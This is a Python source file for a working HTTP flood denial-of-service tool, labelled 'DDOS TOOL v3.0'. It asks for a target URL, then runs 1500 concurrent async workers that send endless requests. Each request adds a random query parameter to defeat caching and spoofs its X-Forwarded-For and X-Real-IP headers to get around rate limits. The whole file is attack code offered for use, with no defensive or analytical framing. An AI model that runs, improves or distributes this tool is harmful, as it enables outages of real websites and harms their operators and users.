import asyncio
import aiohttp
import random
import string
import time
import socket
from urllib.parse import urlparse

# ASCII effect
def slow_print(text, delay=0.03):
    for ch in text:
        print(ch, end='', flush=True)
        time.sleep(delay)
    print()

# Random IP from real ranges (fake but rotated per request)
def random_ip():
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

# Random User-Agent
def random_ua():
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) Firefox/115.0"
    ]
    return random.choice(agents)

# Rotating headers with new IP each call
def rotated_headers():
    return {
        "User-Agent": random_ua(),
        "X-Forwarded-For": random_ip(),
        "X-Real-IP": random_ip(),
        "Accept": "*/*",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache"
    }

# HTTP flood (one request)
async def http_flood(target, session):
    parsed = urlparse(target)
    path = parsed.path or "/"
    rand_param = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
    if parsed.query:
        path += f"?{parsed.query}&{rand_param}={rand_param}"
    else:
        path += f"?{rand_param}={rand_param}"
    url = f"{parsed.scheme}://{parsed.netloc}{path}"
    try:
        async with session.get(url, headers=rotated_headers(), timeout=2, ssl=False) as resp:
            return resp.status
    except:
        return 0

# Main DDoS class
class DDoSTool:
    def __init__(self):
        self.running = True
        self.target = ""
        self.concurrent = 1500

    async def worker(self, session):
        while self.running:
            await http_flood(self.target, session)
            await asyncio.sleep(0.0001)

    async def attack(self, url):
        self.target = url
        slow_print(f"[ATTACK] Target: {self.target}")
        slow_print(f"[ATTACK] Concurrent threads: {self.concurrent}")
        slow_print("[ATTACK] Starting infinite flood. Press Ctrl+C to stop.\n")
        connector = aiohttp.TCPConnector(ssl=False, limit=0)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = [asyncio.create_task(self.worker(session)) for _ in range(self.concurrent)]
            try:
                while self.running:
                    await asyncio.sleep(0.5)
                    # status print every 2 seconds
                    if int(time.time()) % 2 == 0:
                        print(f"[LIVE] Attacking {self.target} ...")
            except KeyboardInterrupt:
                self.running = False
                for t in tasks:
                    t.cancel()
                slow_print("\n[STOPPED] Attack halted by user.")

    def start(self):
        slow_print("=== DDOS TOOL v3.0 | IP ROTATION + INFINITE MODE ===")
        slow_print("=== CODED BY PALOFSC ===")
        url = input("\n[?] Enter target URL (http://example.com): ").strip()
        if not url.startswith("http"):
            url = "http://" + url
        asyncio.run(self.attack(url))

if __name__ == "__main__":
    tool = DDoSTool()
    tool.start()